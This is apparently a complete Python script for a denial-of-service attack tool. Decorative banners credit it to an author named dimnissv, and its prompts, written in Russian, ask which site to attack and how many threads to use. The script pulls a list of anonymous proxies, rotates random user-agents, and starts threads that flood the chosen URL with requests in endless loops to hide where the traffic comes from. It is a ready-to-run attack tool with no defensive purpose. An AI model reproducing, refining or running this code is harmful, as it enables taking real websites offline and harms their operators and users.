import argparse

from urllib.request import urlopen, Request
from threading import Thread
from random import choice
from sys import argv

from proxyscan import ProxyScanIO
from fake_useragent import UserAgent

url, thr = '', 0

banner = '''
@@@@@@@              @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@             @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@             @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@             !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@  !@!  @!@!@!@!@  @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!@!  !!!  !!!@!@!!!  !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!             !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!             :!:  !:!  :!:  !:!  :!:  !:!      !:!   
 :::: ::              :::: ::   :::: ::  ::::: ::  :::: ::   
:: :  :              :: :  :   :: :  :    : :  :   :: : :    

Author: dimnissv
'''

banner2 = '''
 __      __   __   __   __  
|  \ __ |  \ |  \ /  \ /__` 
|__/    |__/ |__/ \__/ .__/ 
                             
Author: dimnissv
'''

banner3 = '''
============================================================
=       =============       ===       =====    =====      ==
=  ====  ============  ====  ==  ====  ===  ==  ===  ====  =
=  ====  ============  ====  ==  ====  ==  ====  ==  ====  =
=  ====  ============  ====  ==  ====  ==  ====  ===  ======
=  ====  ==        ==  ====  ==  ====  ==  ====  =====  ====
=  ====  ============  ====  ==  ====  ==  ====  =======  ==
=  ====  ============  ====  ==  ====  ==  ====  ==  ====  =
=  ====  ============  ====  ==  ====  ===  ==  ===  ====  =
=       =============       ===       =====    =====      ==
============================================================

Author: dimnissv
'''

parser = argparse.ArgumentParser()
parser.add_argument('--url', help='URL to attac', type=str)
parser.add_argument('--thr', help='How many theard use', type=int)
args = parser.parse_args()
if args.url and args.thr:
    url = args.url
    thr = args.thr
elif args.url:
    print(banner2)
    url = args.url
    thr = int(input('Сколько использовать потоков?: '))
elif args.thr:
    print(banner2)
    thr = args.thr
    url = input('Какой сайт атаковать?: ')
else:
    print(choice((banner, banner3)))
    while url == '' or thr == 0:
        url = input('Какой сайт атаковать?: ')
        thr = int(input('Сколько использовать потоков?: '))

protocol = url.split(':', 1)

if len(protocol) < 2:
    protocol = 'http'
    url = 'http://' + url.strip('//')
else:
    protocol = protocol[0]


ps = ProxyScanIO()
ua = UserAgent()
proxies = ps.get_Proxies(type=protocol, level='elite', count=100)


def gotosite():
    while 1:
        head = {'User-Agent': ua.random}
        try:
            proxy_host = choice(proxies)
            req = Request(url, headers=head)
            req.set_proxy(proxy_host, protocol)
            resp = urlopen(req, timeout=3.5)
            code = resp.getcode()
        except Exception as resp:
            if hasattr(resp, "getcode"):
                code = resp.getcode()
            else:
                code = 'Err'
        print(code, 'Запрос отправлен с IP:', proxy_host)
        


for _ in range(thr):
    t = Thread(target=gotosite)
    t.start()
